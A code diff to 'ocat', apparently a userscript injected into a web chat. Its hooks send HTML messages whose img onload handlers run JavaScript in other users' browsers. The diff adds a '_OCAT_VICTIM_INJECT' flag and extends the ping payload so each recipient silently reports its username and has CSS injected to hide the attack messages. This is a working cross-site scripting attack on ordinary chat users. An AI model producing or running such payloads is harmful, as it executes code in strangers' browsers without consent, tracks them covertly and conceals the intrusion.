@@ -1,8 +1,10 @@
 if(!!ocat) throw new Error("Already Injected");
 
+window._OCAT_VICTIM_INJECT = true;
 var ocat = {
 	_LAST_SEEN_CCAT_HASH: -577453995,
 	_START_TIME: Date.now(),
+	_EMPTY_IMAGE_URL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII=",
 	_notification: new Audio(),
 	_currentNotification: null,
 	_currentBannerColor: "transparent",
@@ -433,7 +435,7 @@ var ocat = {
 		if(persistant) img.classList.add("ocat-persistant");
 		img.style.width = 0;
 		img.style.height = 0;
-		socket.emit("html-message", img.outerHTML.replace(/(src\s*=\s*(['"]?)).*?:\/\/__OCAT_IMAGE_SRC_GOES_HERE__\2 /, "$1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII=$2"));
+		socket.emit("html-message", img.outerHTML.replace(/(src\s*=\s*(['"]?)).*?:\/\/__OCAT_IMAGE_SRC_GOES_HERE__\2 /, `$1${this._EMPTY_IMAGE_URL}$2`));
 	},
 	_deleteMessage(id) {
 		// this._sendJsPayload(`document.querySelector('#message-container > div[data-message-id="${id}"]')?.remove();`);
@@ -1548,7 +1550,7 @@ ocat._hooks.pingUsers = () => {
 		ocat._userHistory[user].online = false;
 		ocat._userHistory[user].element.classList.toggle("ocat-online", false);
 	}
-	socket.emit("html-message", `<img class="ocat-user-ping-message" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII=" onload="socket.emit('pongUser', username);this.parentElement.remove();" style="width:0px;height:0px;"/>`);
+	socket.emit("html-message", `<img class="ocat-user-ping-message" src="${ocat._EMPTY_IMAGE_URL}" onload="socket.emit('pongUser', username);if(!window._OCAT_VICTIM_INJECT){window._OCAT_VICTIM_INJECT = true;document.head.insertAdjacentHTML('beforeend', '<style>#message-container>div:has(> img.ocat-user-ping-message){padding:0;height:0;background:transparent !important;}</style>')}this.parentElement.remove();" style="width:0px;height:0px;"/>`);
 };
 
 ocat._hooks.updateUserData = (user, data) => {
